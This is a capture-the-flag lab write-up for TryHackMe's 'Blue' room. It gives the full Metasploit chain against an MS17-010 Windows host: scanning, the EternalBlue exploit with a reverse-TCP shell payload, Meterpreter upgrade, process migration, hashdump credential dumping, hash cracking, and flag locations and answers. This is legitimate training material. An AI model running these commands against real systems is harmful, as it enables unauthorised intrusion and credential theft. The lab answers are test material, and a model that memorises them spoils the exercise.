# Blue

> TryHackMe | Cyber Security 101  
> Room: [Blue](https://tryhackme.com/room/blue)  
> Difficulty: Easy | Tags: Windows, EternalBlue, MS17-010, Metasploit

---

## 📌 Overview

Blue is a beginner-focused room that walks through a complete attack chain
against a Windows machine vulnerable to MS17-010 (EternalBlue). The room
covers reconnaissance, exploitation, privilege escalation, credential dumping,
and flag hunting — all within Metasploit.

**Attack chain:**
```
Nmap scan → identify MS17-010 → EternalBlue exploit → shell
→ upgrade to Meterpreter → getsystem → migrate → hashdump → crack → flags
```

---

## 🔍 Task 1 — Recon

### Nmap Scan

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.49.165.223
```

Flag breakdown:

| Flag | Purpose |
|------|---------|
| `-sV` | Service version detection |
| `-sC` | Run default scripts |
| `--script vuln` | Run vulnerability detection scripts |
| `-oN blue.nmap` | Save output to file |

> ⚠️ The target does not respond to ping (ICMP). If Nmap shows "host down",
> add `-Pn` to skip host discovery and scan anyway.

```bash
nmap -sV -sC --script vuln -Pn -oN blue.nmap 10.49.165.223
```

### Scan Results (key findings)

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
```

**Answers:**
- Ports open under 1000: **3** (135, 139, 445)
- Vulnerability: **ms17-010**

---

## 💥 Task 2 — Exploitation

### Launch Metasploit and find the exploit

```bash
msfconsole
search ms17
use exploit/windows/smb/ms17_010_eternalblue
```

Full exploit path: `exploit/windows/smb/ms17_010_eternalblue`

### Configure and run

```bash
show options
set RHOSTS 10.49.165.223
```

Required option: **RHOSTS**

Set the payload explicitly before running (as instructed):

```bash
set payload windows/x64/shell/reverse_tcp
run
```

Expected output when successful:

```
[+] 10.49.165.223:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.49.165.223:445 - =-=-=-=-=-=-=-=-=-=-=-=-=--=-=-==-=-=-=-=-=-=-=-=-=
[+] 10.49.165.223:445 - ETERNALBLUE overwrite completed successfully!
[*] Command shell session 1 opened
C:\Windows\system32>
```

> 💡 If the shell appears blank, press Enter once to trigger the DOS prompt.
> If the exploit fails, try re-running before rebooting the target — EternalBlue
> can be unstable on first attempt.

### Background the shell

```bash
CTRL+Z
# confirm: y
```

---

## ⬆️ Task 3 — Privilege Escalation (Shell → Meterpreter)

### Why upgrade?

A basic shell has no Meterpreter features — no `hashdump`, no `getsystem`,
no `migrate`. The upgrade converts the existing shell session into a full
Meterpreter agent without re-exploiting.

### Upgrade the shell to Meterpreter

```bash
sessions -u 1                              # quick upgrade method
# OR use the post module manually:
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
run
```

Post module path: `post/multi/manage/shell_to_meterpreter`  
Required option: **SESSION**

### List sessions and connect to the new Meterpreter session

```bash
sessions
sessions -i 3          # Meterpreter session is usually the highest ID
```

### Verify privileges

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
```

Alternatively, drop to shell to confirm:

```bash
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system

CTRL+Z                 # return to Meterpreter
```

### Find and migrate to a stable SYSTEM process

```bash
meterpreter > ps
```

Look for a process near the bottom of the list running as `NT AUTHORITY\SYSTEM`.
Stable candidates include `spoolsv.exe`, `svchost.exe`.

```bash
meterpreter > migrate 1280
[*] Migrating from XXXX to 1280...
[*] Migration completed successfully.
```

> ⚠️ Migration can fail or drop privileges if the target process exits or
> if you migrate to a lower-privileged process. If migration fails, re-run
> the shell-to-Meterpreter conversion or reboot the target and start again.
> Try a different process next attempt.

---

## 🔑 Task 4 — Credential Dumping and Cracking

### Dump password hashes

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Reading the output:**
```
username : RID : LM_hash : NTLM_hash :::
Jon      : 1000 : aad3b435... : ffb43f0de35be4d9917ac0cc8ad57f8d
                                ↑ this is the hash to crack
```

- Non-default user: **Jon**
- `aad3b435b51404eeaad3b435b51404ee` = empty LM hash (disabled on modern Windows, ignore it)

### Crack the hash

Copy the NTLM hash (`ffb43f0de35be4d9917ac0cc8ad57f8d`) and submit to:

```
https://crackstation.net/
```

Result: **alqfna22**

> 💡 CrackStation works by looking up the hash in a precomputed rainbow table.
> This is not "cracking" in the bruteforce sense — it only works if the password
> was in the original wordlist. For hashes not found online, use hashcat or
> John the Ripper with a wordlist locally.

---

## 🚩 Task 5 — Finding the Flags

All three flags are text files hidden in key Windows filesystem locations.
Use `search`, `cd`, `ls`, `cat` inside the Meterpreter session to locate them.

### Navigation commands used

```bash
meterpreter > pwd          # confirm current location
meterpreter > ls           # list files
meterpreter > cd ..        # go up one directory
meterpreter > cat flag1.txt
```

---

### Flag 1 — System Root

**Location:** `C:\`

```bash
meterpreter > cd /
meterpreter > ls
# flag1.txt visible in root
meterpreter > cat flag1.txt
```

> 💡 The system root (`C:\`) is the first place to check — important files
> sometimes get dropped here by admins or are left by attackers during earlier
> compromises.

---

### Flag 2 — Where Passwords Are Stored

**Location:** `C:\Windows\System32\config`

```bash
meterpreter > cd C:/Windows/System32/config
meterpreter > ls
# flag2.txt visible
meterpreter > cat flag2.txt
```

> 💡 `C:\Windows\System32\config` is where the Windows registry hives live —
> including the **SAM** (Security Account Manager) database that stores local
> password hashes. This is exactly why `hashdump` needs SYSTEM privileges:
> the SAM file is locked while Windows is running and only accessible to
> SYSTEM-level processes.

> ⚠️ Note from room: Windows occasionally deletes this flag. If it is missing,
> restart the target and re-run the exploit.

---

### Flag 3 — Administrator Loot Location

**Location:** `C:\Users\Jon\Documents`

```bash
meterpreter > cd C:/Users/Jon/Documents
meterpreter > ls
# flag3.txt visible
meterpreter > cat flag3.txt
```

> 💡 User home directories — especially the Desktop and Documents folders of
> privileged users — are always worth checking during post-exploitation. Admin
> users frequently store credentials, notes, scripts, and sensitive documents
> in these locations.

---

## 🔍 Thinking Through the Room — Full Attack Flow

```
1. RECON
   nmap -sV -sC --script vuln -Pn -oN blue.nmap TARGET_IP
   → identify open ports (135, 139, 445) and ms17-010 vulnerability

2. EXPLOIT
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS TARGET_IP
   set payload windows/x64/shell/reverse_tcp
   run
   → basic shell session opens (Session 1)
   CTRL+Z → background

3. UPGRADE SHELL
   sessions -u 1
   # or: use post/multi/manage/shell_to_meterpreter → set SESSION 1 → run
   sessions -i 3   ← new Meterpreter session

4. PRIVILEGE ESCALATION
   getsystem        ← already SYSTEM via EternalBlue
   getuid           ← confirm: NT AUTHORITY\SYSTEM
   ps               ← find stable SYSTEM process
   migrate 1280     ← migrate for stability

5. CREDENTIAL DUMPING
   hashdump         ← dump NTLM hashes
   → submit Jon's hash to crackstation.net
   → password: alqfna22

6. FLAG HUNTING
   C:\             → flag1.txt
   C:\Windows\System32\config → flag2.txt
   C:\Users\Jon\Documents     → flag3.txt
```

---

## 💡 Insights & Things to Remember

**EternalBlue is a landmark exploit:**  
MS17-010 affected nearly every Windows system before patching. It was used in
WannaCry (May 2017) and NotPetya (June 2017) — two of the most destructive
ransomware attacks in history. Understanding it hands-on makes the history
concrete.

**`sessions -u` vs `shell_to_meterpreter` post module:**  
`sessions -u <id>` is a shortcut that internally runs the same post module.
The manual path (`use post/multi/manage/shell_to_meterpreter`) is more explicit
and gives you visibility into what's happening. Both are valid — knowing both
is useful.

**Migration is about stability, not just stealth:**  
In this room, migrating to a stable SYSTEM process prevents the session from
dying if the original injected process (e.g. `cmd.exe`) exits. In real
engagements, migration also helps with keylogging (attach to the process
receiving keystrokes) and evading process-based detection.

**SAM database = the gold:**  
`C:\Windows\System32\config` is where local credentials live. Gaining access
to this location and reading the SAM hive is the goal of many Windows privilege
escalation paths — `hashdump` automates what would otherwise require manual
registry extraction.

---

## ⚖️ Reflection

**What clicked:**
- The full chain from unauthenticated RCE → SYSTEM → credential dump in a
  single Metasploit session makes the attack surface of an unpatched Windows
  machine viscerally clear
- `sessions -u` is a clean one-liner that I'd reach for in CTFs; the post
  module gives more control in scenarios where the upgrade is failing
- The flag locations are chosen to teach: root = obvious drop location,
  `config` = where credentials live, user Documents = where humans store
  sensitive things

**Still unclear:**
- What would this attack look like without Metasploit? Manual EternalBlue
  exploitation exists (e.g. the Python implementation by worawit) — worth
  understanding the underlying SMB protocol manipulation
- How does `getsystem` work here? EternalBlue already gives SYSTEM — did
  `getsystem` actually do anything, or did it just confirm existing privilege?

**Next:**
- Ice (the next room in this series) — RDP exploitation
- Blaster (third in the series)
- Practice manual hash cracking with `hashcat` locally rather than relying
  on online rainbow tables

---

## 📚 References

- [TryHackMe - Blue](https://tryhackme.com/room/blue)
- [MS17-010 CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [Metasploit EternalBlue module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [CrackStation — NTLM hash lookup](https://crackstation.net/)
- [THM Nmap Room](https://tryhackme.com/room/furthernmap)
- [THM Metasploit Module](https://tryhackme.com/module/metasploit)
